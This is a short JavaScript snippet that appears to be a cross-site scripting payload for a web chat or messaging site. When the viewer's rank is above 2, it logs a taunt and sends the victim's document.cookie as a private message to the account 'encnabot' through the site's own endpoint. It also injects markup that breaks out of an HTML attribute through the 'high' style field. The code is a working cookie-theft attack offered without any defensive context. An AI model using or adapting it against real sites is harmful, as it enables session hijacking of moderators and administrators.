if(user_rank > 2)
  {
    console.log("In your ass bish!!!");
    send_it(document.cookie);
  }

function send_it(message)
{
  		$.ajax({

			url: "system/private_process.php",
			type: "POST",
			data: { 
			content: message, 
			bold: 0, italic: 0, 
			underline: 0, 										
			high: 'yellow;" ></span>  <style="', color: 'rgba(50,50,50,1)', target: 'encnabot'},
			success: function(result){
				console.log("Success");
				console.log(result);
			}    
			,
			error: function(result){
				console.log("Error");
				console.log(result);
			}    
	   
	   
        });   
}
